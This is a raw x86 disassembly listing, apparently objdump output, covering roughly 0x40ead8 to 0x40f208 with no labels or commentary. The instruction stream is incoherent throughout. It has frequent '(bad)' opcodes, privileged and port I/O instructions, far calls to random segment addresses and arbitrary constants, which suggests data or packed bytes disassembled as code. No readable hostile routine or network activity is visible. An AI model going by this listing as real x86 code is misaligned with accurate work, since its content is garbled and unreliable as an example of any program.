  40ead8:	jae    0x40eb00
  40eada:	jnp    0x40eb58
  40eadc:	pop    eax
  40eadd:	jb     0x40eabd
  40eadf:	inc    ebx
  40eae0:	add    cl,ch
  40eae2:	(bad)
  40eae5:	mov    bh,0xae
  40eae7:	shr    edi,0xa1
  40eaea:	retf   
  40eaeb:	mov    ds:0x21076650,eax
  40eaf0:	in     al,0xbe
  40eaf2:	call   0xd26d:0x89885c79
  40eaf9:	pop    eax
  40eafa:	imul   BYTE PTR [edx-0x33]
  40eafd:	ret    
  40eafe:	stc    
  40eaff:	aaa    
  40eb00:	xor    ebx,DWORD PTR [esi+0x75]
  40eb03:	sub    al,0xa3
  40eb05:	push   ds
  40eb06:	ror    DWORD PTR [eax+0x1070236f],0x7b
  40eb0d:	bound  ebx,QWORD PTR [esi-0x1dfd7477]
  40eb13:	jle    0x40ead2
  40eb15:	mov    ecx,0x1e0f16ad
  40eb1a:	sub    al,0x22
  40eb1c:	inc    ecx
  40eb1d:	fnstcw WORD PTR [ebx-0x3b79235e]
  40eb23:	pusha  
  40eb24:	fild   DWORD PTR [edx+0x64]
  40eb27:	mov    ds:0x922d4274,eax
  40eb2c:	adc    DWORD PTR [ecx+0x3a],ecx
  40eb2f:	push   ebx
  40eb30:	xor    eax,0xa9858daa
  40eb35:	push   cs
  40eb36:	pop    ds
  40eb37:	sub    DWORD PTR [ecx-0x43],0xc6071eec
  40eb3e:	fs aas 
  40eb40:	dec    ecx
  40eb41:	lahf   
  40eb42:	pushf  
  40eb43:	and    BYTE PTR [ebp+0x17e864b4],cl
  40eb49:	shr    DWORD PTR [ebp+0x4d],1
  40eb4c:	or     BYTE PTR [edi],bl
  40eb4e:	fcmovb st,st(6)
  40eb50:	std    
  40eb51:	shl    DWORD PTR [esi-0x38e760ea],0x62
  40eb58:	fwait
  40eb59:	xor    DWORD PTR [eax-0x7c4a5278],ebx
  40eb5f:	sub    DWORD PTR [ebx],0x99b215c4
  40eb65:	cmp    ecx,DWORD PTR [esp+ebp*1]
  40eb68:	(bad)  
  40eb6a:	cmc    
  40eb6b:	jnp    0x40ebad
  40eb6d:	stos   BYTE PTR es:[edi],al
  40eb6e:	mov    bl,bh
  40eb70:	xchg   ebp,eax
  40eb71:	stc    
  40eb72:	pop    ebp
  40eb73:	xor    ecx,esi
  40eb75:	jmp    0x40eb36
  40eb77:	adc    edx,DWORD PTR [eax+eiz*8]
  40eb7a:	loop   0x40ebd3
  40eb7c:	xor    eax,0xf814753b
  40eb81:	mov    al,ds:0x8775d6d
  40eb86:	inc    ebx
  40eb87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb88:	(bad)  
  40eb89:	aad    0xe3
  40eb8b:	and    ebp,DWORD PTR [edx+0xf]
  40eb8e:	mov    cl,0xb4
  40eb90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb91:	dec    ecx
  40eb92:	jmp    0x40eb6b
  40eb94:	jae    0x40ec00
  40eb96:	js     0x40eba2
  40eb98:	push   edi
  40eb99:	or     eax,0x915d40c2
  40eb9e:	jne    0x40eb5d
  40eba0:	frstor [esi]
  40eba2:	jp     0x40eb81
  40eba4:	push   0x3a
  40eba6:	push   ebp
  40eba7:	mov    ds:0xbc28c50a,al
  40ebac:	pop    esp
  40ebad:	and    eax,0x6a1f0de9
  40ebb2:	mov    ebx,0x8c3973c7
  40ebb7:	ins    DWORD PTR es:[edi],dx
  40ebb8:	dec    esi
  40ebb9:	pop    ss
  40ebba:	stos   DWORD PTR es:[edi],eax
  40ebbb:	or     eax,0xf648866a
  40ebc0:	push   0x5b
  40ebc2:	sti    
  40ebc3:	xchg   ebp,eax
  40ebc4:	loopne 0x40eb6c
  40ebc6:	or     ah,ah
  40ebc8:	jmp    0xac10275b
  40ebcd:	pop    ecx
  40ebce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebcf:	cmp    DWORD PTR [esi+ebx*4+0x7b],ecx
  40ebd3:	mov    dh,0x2
  40ebd5:	inc    ebp
  40ebd6:	pop    edi
  40ebd7:	push   ss
  40ebd8:	dec    ebx
  40ebd9:	pop    edx
  40ebda:	fnstenv [ebx-0x3d]
  40ebdd:	jne    0x40ebcb
  40ebdf:	neg    BYTE PTR [esi]
  40ebe1:	daa    
  40ebe2:	and    eax,0xee5b3ec3
  40ebe7:	adc    BYTE PTR [ebx-0x4691633c],al
  40ebed:	and    DWORD PTR [ebx+0xb],esp
  40ebf0:	shl    DWORD PTR [esi],cl
  40ebf2:	adc    DWORD PTR [edx+0x17],ebx
  40ebf5:	ins    BYTE PTR es:[edi],dx
  40ebf6:	sbb    DWORD PTR [eax],ecx
  40ebf8:	push   ss
  40ebf9:	or     eax,0x3e6cc7cc
  40ebfe:	test   eax,0x53d51544
  40ec03:	sbb    bl,0x86
  40ec06:	loop   0x40ebb2
  40ec08:	enter  0xfe7a,0x9
  40ec0c:	mov    dh,0x7c
  40ec0e:	lods   eax,DWORD PTR ds:[esi]
  40ec0f:	popa   
  40ec10:	jb     0x40ec06
  40ec12:	sbb    eax,0x489d9a21
  40ec17:	out    dx,eax
  40ec18:	mov    WORD PTR [esi-0x61],gs
  40ec1b:	aas    
  40ec1c:	sbb    dl,BYTE PTR [eax-0x20]
  40ec1f:	push   ds
  40ec20:	inc    edx
  40ec21:	adc    DWORD PTR [eax],ecx
  40ec23:	adc    dh,BYTE PTR [eax+eiz*8]
  40ec26:	jb     0x40ec19
  40ec28:	inc    esi
  40ec29:	pop    ebp
  40ec2a:	and    BYTE PTR [eax+0x5b11cdc3],0xc4
  40ec31:	fild   WORD PTR [edi]
  40ec33:	(bad)  
  40ec35:	aaa    
  40ec36:	and    ah,al
  40ec38:	je     0x40ebdc
  40ec3a:	sub    eax,0x8eca06a5
  40ec3f:	test   DWORD PTR [esi],ebp
  40ec41:	fmul   QWORD PTR [ebp+0x23]
  40ec44:	xor    BYTE PTR [ebp-0x56d877c6],dh
  40ec4a:	lahf   
  40ec4b:	sbb    cl,BYTE PTR [ebx-0x1370318e]
  40ec51:	and    BYTE PTR [edi+esi*8],cl
  40ec54:	in     al,dx
  40ec55:	arpl   WORD PTR [esi],si
  40ec57:	cdq    
  40ec58:	int3   
  40ec59:	xchg   eax,edx
  40ec5b:	call   0x170e:0xe51671d6
  40ec62:	stos   DWORD PTR es:[edi],eax
  40ec63:	ret    
  40ec64:	jno    0x40ec50
  40ec66:	pop    edx
  40ec67:	xchg   ebp,eax
  40ec68:	and    al,0x1e
  40ec6a:	jge    0x40ec83
  40ec6c:	ss loopne 0x40ec24
  40ec6f:	arpl   WORD PTR [ecx-0x777c6fb5],bx
  40ec75:	push   ds
  40ec76:	dec    esi
  40ec77:	pop    ebx
  40ec78:	push   ecx
  40ec79:	xchg   edi,ebp
  40ec7b:	jecxz  0x40eca9
  40ec7d:	push   cs
  40ec7e:	jne    0x40ecd0
  40ec80:	dec    edx
  40ec81:	xor    eax,0x6c960933
  40ec86:	out    0x7d,al
  40ec88:	xchg   ebp,eax
  40ec89:	mov    al,BYTE PTR ds:0xe872effe
  40ec8f:	dec    ecx
  40ec90:	push   cs
  40ec91:	and    BYTE PTR [edx],dh
  40ec93:	push   ss
  40ec94:	stos   DWORD PTR es:[edi],eax
  40ec95:	into   
  40ec96:	pop    esp
  40ec97:	ja     0x40ed0e
  40ec99:	int3   
  40ec9a:	fnstcw WORD PTR [edx]
  40ec9c:	cwde   
  40ec9d:	mov    ah,0xe9
  40ec9f:	add    al,0xff
  40eca1:	hlt    
  40eca2:	inc    ecx
  40eca3:	sub    eax,0x458eea2e
  40eca8:	test   DWORD PTR [edi],ecx
  40ecaa:	cwde   
  40ecab:	push   cs
  40ecac:	out    dx,eax
  40ecad:	or     edi,esp
  40ecaf:	adc    ebx,ecx
  40ecb1:	add    DWORD PTR [ecx-0x7158ebb6],edi
  40ecb7:	sub    BYTE PTR [ebx+eiz*8-0x60d3ad90],bl
  40ecbe:	push   ss
  40ecbf:	imul   esp,DWORD PTR [edx+eiz*4+0xf],0x38
  40ecc4:	sub    BYTE PTR [ebx+ecx*2-0x36],bh
  40ecc8:	fnstenv [eax]
  40ecca:	cld    
  40eccb:	push   ecx
  40eccc:	cwde   
  40eccd:	outs   dx,DWORD PTR ds:[esi]
  40ecce:	movq   QWORD PTR [ecx],mm0
  40ecd1:	jnp    0x40ed37
  40ecd3:	mov    ecx,0xc5c15b75
  40ecd8:	sub    BYTE PTR [edi+0x73],ah
  40ecdb:	cwde   
  40ecdc:	call   0x6687:0x5c60de50
  40ece3:	cmp    BYTE PTR [eax],ch
  40ece5:	test   dh,cl
  40ece7:	lds    edi,FWORD PTR [esi+0x63]
  40ecea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eceb:	pushf  
  40ecec:	retf   0xd004
  40ecef:	pop    esi
  40ecf0:	or     dh,BYTE PTR [ebp-0x38cf7e8a]
  40ecf6:	call   0xbb7d:0xbfb3838
  40ecfd:	sub    ch,ch
  40ecff:	add    al,BYTE PTR [esi+0x2d]
  40ed02:	icebp  
  40ed03:	fcomp  DWORD PTR [ebx-0x151454]
  40ed09:	aas    
  40ed0a:	or     edx,DWORD PTR [ecx+0xe234eef]
  40ed10:	push   esi
  40ed11:	les    edi,FWORD PTR [esi-0x74134643]
  40ed17:	add    eax,0x119caefb
  40ed1c:	stc    
  40ed1d:	or     BYTE PTR [edi+0x30c19bbe],bh
  40ed23:	and    edi,esp
  40ed25:	jmp    0xd8df5ee0
  40ed2a:	adc    al,0x0
  40ed2c:	lods   al,BYTE PTR ds:[esi]
  40ed2d:	jge    0x40ecb4
  40ed2f:	mov    cl,0xb9
  40ed31:	jecxz  0x40ecc3
  40ed33:	inc    edi
  40ed34:	lds    edi,FWORD PTR [eax-0x69]
  40ed37:	repz mov eax,ds:0xf2efb7c5
  40ed3d:	dec    esi
  40ed3e:	loope  0x40edad
  40ed40:	inc    esp
  40ed41:	jle    0x40ecc5
  40ed43:	aas    
  40ed44:	dec    esp
  40ed45:	rcl    DWORD PTR [edi],1
  40ed47:	test   eax,0x3a46d96e
  40ed4c:	stc    
  40ed4d:	js     0x40ed15
  40ed4f:	jns    0x40ece4
  40ed51:	add    DWORD PTR [ebp-0xe],ebp
  40ed54:	imul   ebx,DWORD PTR [edi+0x29],0x6f
  40ed58:	xor    ebx,DWORD PTR [edi]
  40ed5a:	loope  0x40ed9a
  40ed5c:	lods   eax,DWORD PTR ds:[esi]
  40ed5d:	jo     0x40ed06
  40ed5f:	das    
  40ed60:	add    edi,DWORD PTR [eax-0x133d26d0]
  40ed66:	inc    ecx
  40ed67:	in     eax,0xf6
  40ed69:	sbb    ebp,eax
  40ed6b:	in     al,dx
  40ed6c:	sbb    eax,DWORD PTR [edx+0x2]
  40ed6f:	mov    ch,0xbd
  40ed71:	mov    edx,0x49ee2c9f
  40ed76:	sub    dh,BYTE PTR [eax+0x2d140db6]
  40ed7c:	ins    BYTE PTR es:[edi],dx
  40ed7d:	jae    0x40ed6f
  40ed7f:	push   0xffffffcf
  40ed81:	int    0x44
  40ed83:	inc    ebp
  40ed84:	mov    es:0x47173997,al
  40ed8a:	fistp  WORD PTR [edi+ebx*4+0x57fcedd5]
  40ed91:	clc    
  40ed92:	(bad)  
  40ed93:	stc    
  40ed94:	pop    ss
  40ed95:	popa   
  40ed96:	in     eax,dx
  40ed97:	ss ret 
  40ed99:	jnp    0x40ed48
  40ed9b:	jg     0x40ed9b
  40ed9d:	mov    bh,0xbe
  40eda0:	sub    al,0x3b
  40eda2:	xchg   BYTE PTR [edx-0x667c244a],bh
  40eda8:	repz pop es
  40edaa:	aam    0xc5
  40edac:	dec    esp
  40edad:	sar    esp,0x28
  40edb0:	out    0xd3,eax
  40edb2:	jo     0x40edaa
  40edb4:	mov    dh,0x7
  40edb6:	in     al,0xd
  40edb8:	mov    WORD PTR [eax],?
  40edba:	mov    eax,ds:0x91f183c8
  40edbf:	push   ebp
  40edc0:	dec    eax
  40edc1:	add    eax,0x50136845
  40edc6:	aas    
  40edc7:	xlat   BYTE PTR ds:[ebx]
  40edc8:	imul   esi,DWORD PTR ds:0xae03c79,0x7ad91fbb
  40edd2:	por    mm0,QWORD PTR [edi+0x175ee23d]
  40edd9:	aaa    
  40edda:	mov    dl,0x95
  40eddc:	(bad)  
  40eddd:	shr    BYTE PTR [ecx],1
  40eddf:	repz add esp,0xc89fa027
  40ede6:	jne    0x40ede8
  40ede8:	adc    ebp,DWORD PTR [ebp-0x164a1b51]
  40edee:	push   edi
  40edef:	mov    ebp,0x85114fb5
  40edf4:	fsubr  st(2),st
  40edf6:	lods   al,BYTE PTR ds:[esi]
  40edf7:	mov    fs,ecx
  40edf9:	bound  edx,QWORD PTR [eax-0x13661cb0]
  40edff:	inc    edx
  40ee00:	ror    BYTE PTR [ebx+0x36],1
  40ee03:	sub    ch,0xa7
  40ee06:	and    esp,DWORD PTR [esi+edx*4+0x62ba86f7]
  40ee0d:	mov    edx,0x1fb07117
  40ee12:	arpl   WORD PTR [ebp-0x49],cx
  40ee15:	dec    edx
  40ee16:	xchg   esp,eax
  40ee17:	icebp  
  40ee18:	mov    ebp,0xdfbb50b2
  40ee1d:	rsm    
  40ee1f:	repnz inc eax
  40ee21:	or     edx,DWORD PTR [edx-0x7ea4f46f]
  40ee27:	add    ebx,ebp
  40ee29:	leave  
  40ee2a:	xor    ebx,DWORD PTR ds:0xf2a153a
  40ee30:	cmp    eax,0x60fafeba
  40ee35:	and    DWORD PTR [edx],ebp
  40ee37:	repz and eax,0x9f37f270
  40ee3d:	or     al,0x65
  40ee3f:	mov    ah,0x7d
  40ee41:	push   ebp
  40ee42:	dec    eax
  40ee43:	lahf   
  40ee44:	xchg   esp,eax
  40ee45:	mov    ecx,0x60afce82
  40ee4a:	mov    al,0x6f
  40ee4c:	push   ebp
  40ee4d:	push   ebp
  40ee4e:	adc    ah,BYTE PTR [ebp-0x21]
  40ee51:	fcmove st,st(0)
  40ee53:	test   al,0x3d
  40ee55:	xor    eax,0x226e26e2
  40ee5a:	(bad)  
  40ee5c:	ins    BYTE PTR es:[edi],dx
  40ee5d:	inc    esi
  40ee5e:	mov    ch,0xaf
  40ee60:	xor    eax,edx
  40ee62:	push   ecx
  40ee63:	je     0x40edf9
  40ee65:	loop   0x40ee03
  40ee67:	loopne 0x40eec6
  40ee69:	push   ecx
  40ee6a:	add    DWORD PTR [edx-0x1d806501],0xffffff86
  40ee71:	mov    eax,0xbd7009ed
  40ee76:	jns    0x40ee01
  40ee78:	dec    eax
  40ee79:	lea    ebx,[esi+0x125764c5]
  40ee7f:	out    dx,al
  40ee80:	cli    
  40ee81:	jge    0x40ee62
  40ee83:	in     al,0x5d
  40ee85:	pop    ebx
  40ee86:	popa   
  40ee87:	sub    eax,0x26ab92c3
  40ee8c:	xchg   ebx,eax
  40ee8d:	sub    bh,BYTE PTR [ebx]
  40ee8f:	inc    ebx
  40ee90:	jl     0x40ee98
  40ee92:	adc    BYTE PTR [edi+0x6f],ch
  40ee95:	shl    DWORD PTR [ebp+0x501902eb],0x17
  40ee9c:	dec    ecx
  40ee9d:	test   eax,0xc86cfe2f
  40eea2:	das    
  40eea3:	xor    ebp,ecx
  40eea5:	in     al,dx
  40eea6:	and    eax,0x53596631
  40eeab:	(bad)  
  40eeac:	mov    esi,0x878ca16e
  40eeb1:	adc    DWORD PTR ds:0xb3034ab1,edx
  40eeb7:	pop    ecx
  40eeb8:	aam    0xef
  40eeba:	in     eax,0xd9
  40eebc:	adc    al,0xb8
  40eebe:	aas    
  40eebf:	xchg   edx,eax
  40eec0:	int    0x5f
  40eec2:	and    edx,DWORD PTR [edi+ecx*1-0x53]
  40eec6:	gs push ds
  40eec8:	lods   al,BYTE PTR ds:[esi]
  40eec9:	sub    al,0x18
  40eecb:	inc    ebx
  40eecc:	out    0xda,al
  40eece:	sub    al,0xbb
  40eed0:	fmul   DWORD PTR [ecx+0x23ceb09]
  40eed6:	cmc    
  40eed7:	(bad)  
  40eed8:	call   0x93bad578
  40eedd:	repz or al,0xc0
  40eee0:	(bad)  
  40eee1:	pop    esi
  40eee2:	(bad)  [esi]
  40eee4:	xchg   edx,eax
  40eee5:	inc    eax
  40eee6:	jns    0x40ef07
  40eee8:	out    dx,al
  40eee9:	je     0x40ef02
  40eeeb:	in     eax,dx
  40eeec:	jo     0x40ef23
  40eeee:	jo     0x40ef18
  40eef0:	add    BYTE PTR [esi-0x686eb888],dl
  40eef6:	push   0xffffffbb
  40eef8:	in     eax,dx
  40eef9:	(bad)  
  40eefa:	sbb    DWORD PTR [ecx+0x7b],ecx
  40eefd:	xchg   esp,eax
  40eefe:	enter  0xdaab,0xff
  40ef02:	fbstp  TBYTE PTR [ecx]
  40ef04:	es adc edx,edx
  40ef07:	bound  esp,QWORD PTR [edi]
  40ef09:	sbb    edx,DWORD PTR [edi]
  40ef0b:	cwde   
  40ef0c:	add    eax,0x5e0cced5
  40ef11:	push   0xffffffdb
  40ef13:	stc    
  40ef14:	add    ah,BYTE PTR [ebp+eax*2+0x65]
  40ef18:	ja     0x40eec9
  40ef1a:	mov    ds,WORD PTR [eax+0x43c6c67a]
  40ef20:	je     0x40ef5d
  40ef22:	mov    BYTE PTR [esi-0x65],dh
  40ef25:	cli    
  40ef26:	jmp    DWORD PTR [eax]
  40ef28:	xor    esp,ecx
  40ef2a:	or     eax,0x59c15826
  40ef2f:	push   eax
  40ef30:	and    eax,0x6f5e88c4
  40ef35:	sbb    esi,0xffffff8e
  40ef38:	mov    ah,0x2b
  40ef3a:	rcr    BYTE PTR [ebp+0x1e],0x26
  40ef3e:	push   esp
  40ef3f:	push   ds
  40ef40:	jge    0x40ef76
  40ef42:	cmp    ecx,DWORD PTR [ebp+0x3a]
  40ef45:	fs add edi,esp
  40ef48:	inc    edi
  40ef49:	cdq    
  40ef4a:	jae    0x40ef0b
  40ef4c:	gs loopne 0x40ef74
  40ef4f:	ficom  WORD PTR [esi+0x31f8644b]
  40ef55:	add    esi,DWORD PTR [esi]
  40ef57:	in     eax,dx
  40ef58:	adc    eax,0x1b599d8
  40ef5d:	dec    edx
  40ef5e:	sbb    esi,DWORD PTR [ecx-0x12]
  40ef61:	add    DWORD PTR [edx+0x45],edx
  40ef64:	or     al,0xe2
  40ef66:	xor    bh,ch
  40ef68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef69:	popa   
  40ef6a:	mov    esi,0xea3c115b
  40ef6f:	outs   dx,BYTE PTR ds:[esi]
  40ef70:	xor    eax,edi
  40ef72:	xchg   edi,eax
  40ef73:	jbe    0x40ef32
  40ef75:	jae    0x40efd1
  40ef77:	call   0xa02a:0xad988ce5
  40ef7e:	xor    bh,dl
  40ef80:	stc    
  40ef81:	test   bl,bl
  40ef83:	inc    ecx
  40ef84:	xor    dh,BYTE PTR [ecx+0x7a31d018]
  40ef8a:	cmp    ah,BYTE PTR [esp+0x1]
  40ef8e:	xchg   esi,eax
  40ef8f:	mov    esi,DWORD PTR [edx+0x61accb7f]
  40ef95:	jp     0x40ef74
  40ef97:	scas   al,BYTE PTR es:[edi]
  40ef98:	inc    esi
  40ef99:	sbb    BYTE PTR [edi-0x76],0xcc
  40ef9d:	fwait
  40ef9e:	mov    eax,ds:0x837e47e9
  40efa3:	sbb    DWORD PTR [ebp+0x4f2221d7],0xffffff92
  40efaa:	add    bh,BYTE PTR [ebx+0x2a4ce3a3]
  40efb0:	jo     0x40ef37
  40efb2:	pop    esi
  40efb3:	fwait
  40efb4:	jo     0x40f005
  40efb6:	push   ebp
  40efb7:	and    BYTE PTR [edi+0x6d],ah
  40efba:	xchg   ebp,eax
  40efbb:	cmc    
  40efbc:	inc    esp
  40efbd:	or     ebp,edx
  40efbf:	pop    ss
  40efc0:	jecxz  0x40efff
  40efc2:	shl    DWORD PTR ds:0x23c1896,0xde
  40efc9:	jmp    0x40efd5
  40efcb:	mov    ?,WORD PTR [edi]
  40efcd:	cmc    
  40efce:	dec    ebp
  40efcf:	loopne 0x40efc7
  40efd1:	aaa    
  40efd2:	mov    BYTE PTR [esi],0x5a
  40efd5:	fdiv   DWORD PTR [ebp-0x6b]
  40efd8:	mov    eax,0xc9d9e23a
  40efdd:	cmp    dh,BYTE PTR [edx]
  40efdf:	mov    ds:0x60b4835e,eax
  40efe4:	inc    ebx
  40efe5:	dec    ecx
  40efe6:	xchg   esp,eax
  40efe7:	iret   
  40efe8:	sub    eax,0xdc1c875a
  40efed:	int3   
  40efee:	nop
  40efef:	mov    cl,0x47
  40eff1:	and    eax,DWORD PTR [esi-0x7a]
  40eff4:	jno    0x40efe5
  40eff6:	scas   al,BYTE PTR es:[edi]
  40eff7:	push   esp
  40eff8:	mov    esp,DWORD PTR [esi]
  40effa:	(bad)  
  40effb:	jae    0x40f048
  40effd:	iret   
  40effe:	ins    BYTE PTR es:[edi],dx
  40efff:	retf   0x25bb
  40f002:	adc    eax,0x5ba5d735
  40f007:	cmp    ebx,DWORD PTR [ebx+0x2f]
  40f00a:	daa    
  40f00b:	push   esp
  40f00c:	call   0xd94a8f4a
  40f011:	es arpl WORD PTR es:[edi],cx
  40f015:	cmc    
  40f016:	dec    ecx
  40f017:	or     DWORD PTR [ebx],edx
  40f019:	sub    edi,DWORD PTR [edi-0x16f205c5]
  40f01f:	fld    QWORD PTR [ebx]
  40f021:	int    0x7d
  40f023:	push   0xfc8b90f4
  40f028:	retf   
  40f029:	data16 ja 0x40f072
  40f02c:	mov    eax,0xc237bb3b
  40f031:	add    DWORD PTR [ecx],ecx
  40f033:	push   edx
  40f034:	dec    cl
  40f036:	sbb    al,0x25
  40f038:	jp     0x40f0a3
  40f03a:	lods   eax,DWORD PTR ds:[esi]
  40f03b:	fcmovnb st,st(5)
  40f03d:	gs pop edx
  40f03f:	push   eax
  40f040:	int3   
  40f041:	mov    bh,cl
  40f043:	lods   al,BYTE PTR ds:[esi]
  40f044:	push   cs
  40f045:	jl     0x40efe3
  40f047:	push   0x18
  40f049:	and    ch,BYTE PTR fs:[esi-0x27]
  40f04d:	test   BYTE PTR [ebx+ecx*1+0x4889fac4],bh
  40f054:	hlt    
  40f055:	sar    BYTE PTR [edi-0x37],0xbd
  40f059:	push   edi
  40f05a:	xchg   ebx,eax
  40f05b:	imul   DWORD PTR [ebp-0x7e]
  40f05e:	mov    bl,0xbf
  40f060:	cmp    esp,DWORD PTR [edx]
  40f062:	xchg   edx,eax
  40f063:	imul   ecx,ecx,0xffffffd0
  40f066:	pop    ss
  40f067:	sbb    dl,al
  40f069:	stc    
  40f06a:	out    dx,al
  40f06b:	int    0x1a
  40f06d:	xchg   DWORD PTR [esi+edi*4],ecx
  40f070:	mov    dl,0xf6
  40f072:	punpckhwd mm7,QWORD PTR [eax]
  40f075:	in     al,dx
  40f076:	(bad)  
  40f077:	fldcw  WORD PTR [eax-0x52]
  40f07a:	xor    ebx,DWORD PTR [ecx+0x1b]
  40f07d:	scas   eax,DWORD PTR es:[edi]
  40f07e:	xor    ch,BYTE PTR [ebx-0x54]
  40f081:	enter  0x6192,0xb0
  40f085:	cli    
  40f086:	loope  0x40f08d
  40f088:	(bad)  
  40f089:	outs   dx,BYTE PTR ds:[esi]
  40f08a:	cmp    al,0xc5
  40f08c:	loopne 0x40f0f5
  40f08e:	inc    esp
  40f08f:	sahf   
  40f090:	adc    DWORD PTR [esi+0x1],esi
  40f093:	inc    eax
  40f094:	pop    edx
  40f095:	and    ebx,edi
  40f097:	pop    edi
  40f098:	add    DWORD PTR [edx+0x774137d1],0x1
  40f09f:	int    0x32
  40f0a1:	mov    gs,edx
  40f0a3:	sbb    DWORD PTR [edi],eax
  40f0a5:	pushf  
  40f0a6:	ror    edi,1
  40f0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a9:	sbb    al,bl
  40f0ab:	das    
  40f0ac:	adc    eax,0x14f054e4
  40f0b1:	(bad)  
  40f0b2:	sub    al,0x38
  40f0b4:	ins    BYTE PTR es:[edi],dx
  40f0b5:	inc    esi
  40f0b6:	inc    edx
  40f0b7:	shl    BYTE PTR [ebx+0x1a17536d],cl
  40f0bd:	push   0xfa206044
  40f0c2:	xchg   edi,eax
  40f0c3:	mov    DWORD PTR [eax],ebp
  40f0c5:	adc    DWORD PTR [edi],esp
  40f0c7:	sbb    ah,bl
  40f0c9:	jecxz  0x40f11f
  40f0cb:	ins    DWORD PTR es:[edi],dx
  40f0cc:	in     eax,0xf6
  40f0ce:	idiv   DWORD PTR ds:0x6fe17053
  40f0d4:	jne    0x40f07d
  40f0d6:	jo     0x40f0b2
  40f0d8:	shr    DWORD PTR [esi+eax*4+0x59],cl
  40f0dc:	loopne 0x40f0b1
  40f0de:	loopne 0x40f141
  40f0e0:	sub    al,0x7b
  40f0e2:	sbb    DWORD PTR [esi],edx
  40f0e4:	sub    BYTE PTR cs:[edx],dl
  40f0e7:	mov    edx,0xb0339c6c
  40f0ec:	pop    ebx
  40f0ed:	repz push eax
  40f0ef:	mov    ebp,edi
  40f0f1:	push   eax
  40f0f2:	dec    ecx
  40f0f3:	call   0x3601:0x3f420039
  40f0fa:	cli    
  40f0fb:	jns    0x40f09d
  40f0fd:	sub    bh,BYTE PTR [eax]
  40f0ff:	or     al,0x6f
  40f101:	xchg   DWORD PTR [ecx+edi*2],ebp
  40f104:	je     0x40f15d
  40f106:	adc    al,0xfc
  40f108:	jae    0x40f0f7
  40f10a:	mov    edx,0x7305902c
  40f10f:	and    esp,esp
  40f111:	adc    dh,BYTE PTR [esi]
  40f113:	sbb    dh,BYTE PTR [eax+0x1362aaa2]
  40f119:	in     eax,0x96
  40f11b:	pop    ss
  40f11c:	arpl   WORD PTR ds:0xd6cef55,sp
  40f122:	mov    cl,0x3a
  40f124:	out    dx,al
  40f125:	ret    
  40f126:	rol    DWORD PTR [ecx+0x69],cl
  40f129:	out    0xac,eax
  40f12b:	xchg   ecx,eax
  40f12c:	push   eax
  40f12d:	and    cl,BYTE PTR [ebx]
  40f12f:	js     0x40f0e7
  40f131:	jbe    0x40f170
  40f133:	in     eax,dx
  40f134:	in     eax,0x49
  40f136:	xchg   DWORD PTR [eax],esi
  40f138:	dec    ecx
  40f139:	stc    
  40f13a:	sub    cl,BYTE PTR [edi+eiz*1+0x4]
  40f13e:	(bad)  
  40f13f:	sbb    DWORD PTR [ebx+0x10],ecx
  40f142:	stc    
  40f143:	or     esp,esp
  40f145:	adc    DWORD PTR [edx+0x4b484e2f],0x6790b02f
  40f14f:	or     DWORD PTR [esp+eax*8-0x1818f002],ecx
  40f156:	mov    cl,0xd
  40f158:	push   ds
  40f159:	pusha  
  40f15a:	cmp    edx,ecx
  40f15c:	dec    esp
  40f15d:	popf   
  40f15e:	xor    BYTE PTR [ebx+0x6c],0x2c
  40f162:	dec    edx
  40f163:	stos   BYTE PTR es:[edi],al
  40f164:	jno    0x40f1a9
  40f166:	jae    0x40f160
  40f168:	stos   BYTE PTR es:[edi],al
  40f169:	xor    bh,BYTE PTR [eax+0x13d7a65a]
  40f16f:	cdq    
  40f170:	mov    dl,0xeb
  40f172:	and    ah,ch
  40f174:	call   0xbd48:0x874d335f
  40f17b:	mov    ah,BYTE PTR ds:0x14f892a7
  40f181:	icebp  
  40f182:	retf   0xae15
  40f185:	dec    ebp
  40f186:	sti    
  40f187:	stos   BYTE PTR es:[edi],al
  40f188:	fnsave [edx+0x7d]
  40f18b:	cs cmc 
  40f18d:	or     esp,DWORD PTR [ebx+0x2cf13795]
  40f193:	push   ebp
  40f194:	mov    al,ds:0xa9297b9d
  40f199:	(bad)  
  40f19a:	cmp    al,0x1
  40f19c:	jne    0x40f178
  40f19e:	pop    edi
  40f19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1a0:	jnp    0x40f185
  40f1a2:	and    al,bh
  40f1a4:	inc    ebx
  40f1a5:	lea    ecx,[ecx]
  40f1a7:	push   ebx
  40f1a8:	cli    
  40f1a9:	in     eax,0xfb
  40f1ab:	pop    ds
  40f1ac:	mov    cl,0xb8
  40f1ae:	fadd   QWORD PTR [eax+0x518d21c]
  40f1b4:	arpl   dx,sp
  40f1b6:	lods   al,BYTE PTR ds:[esi]
  40f1b7:	test   bl,cl
  40f1b9:	in     al,dx
  40f1ba:	inc    esi
  40f1bb:	pop    esp
  40f1bc:	xor    dh,ch
  40f1be:	mov    al,0x1f
  40f1c0:	out    0xf4,eax
  40f1c2:	adc    DWORD PTR [edx-0x70fdec0c],ebp
  40f1c8:	(bad)  
  40f1c9:	pop    esi
  40f1ca:	sbb    al,0x40
  40f1cc:	stos   DWORD PTR es:[edi],eax
  40f1cd:	cld    
  40f1ce:	inc    ebx
  40f1cf:	mov    al,0xbb
  40f1d1:	loop   0x40f188
  40f1d3:	pop    edi
  40f1d4:	pop    es
  40f1d5:	sti    
  40f1d6:	fdiv   DWORD PTR [edx-0x37588ff2]
  40f1dc:	jo     0x40f1c8
  40f1de:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e0:	shr    DWORD PTR [ecx+0x26f35e03],1
  40f1e6:	shr    BYTE PTR [ebx+0x46],cl
  40f1e9:	sub    ch,BYTE PTR [ecx]
  40f1eb:	call   0xc496d26a
  40f1f0:	stos   BYTE PTR es:[edi],al
  40f1f1:	cmp    BYTE PTR [ecx],cl
  40f1f3:	fdiv   DWORD PTR [eax+0x6913dbe3]
  40f1f9:	mov    al,0xdc
  40f1fb:	jp     0x40f1db
  40f1fd:	mov    BYTE PTR [edx],bl
  40f1ff:	lahf   
  40f200:	psubsw mm2,QWORD PTR [edi-0x7b]
  40f204:	clc    
  40f205:	push   ebp
  40f206:	jo     0x40f257
  40f208:	xchg   edx,eax
